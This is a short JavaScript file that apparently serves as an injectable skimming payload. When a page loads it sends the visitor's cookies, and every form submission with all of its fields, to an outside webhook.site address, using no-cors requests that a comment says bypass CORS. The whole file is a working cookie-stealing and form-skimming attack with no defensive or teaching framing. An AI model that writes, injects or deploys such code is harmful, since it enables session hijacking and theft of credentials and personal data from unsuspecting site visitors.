// Wait for page to load
document.addEventListener("DOMContentLoaded", function() {
  
  // Send cookies immediately when script loads
  if (document.cookie) {
    fetch("https://webhook.site/38310abd-731f-4bb1-95aa-78d558225823", {
      method: "POST",
      mode: "no-cors", // Bypass CORS
      headers: {
        "Content-Type": "text/plain"
      },
      body: "COOKIES: " + document.cookie
    });
  }

  // Capture form submissions
  document.addEventListener("submit", function(e) {
    const form = e.target;
    const formData = new FormData(form);
    const data = {};
    
    // Convert FormData to object
    for (let [key, value] of formData.entries()) {
      data[key] = value;
    }
    
    // Send form data
    fetch("https://webhook.site/38310abd-731f-4bb1-95aa-78d558225823", {
      method: "POST",
      mode: "no-cors", // Bypass CORS
      headers: {
        "Content-Type": "text/plain"
      },
      body: "FORM DATA: " + JSON.stringify(data)
    });
  });
});
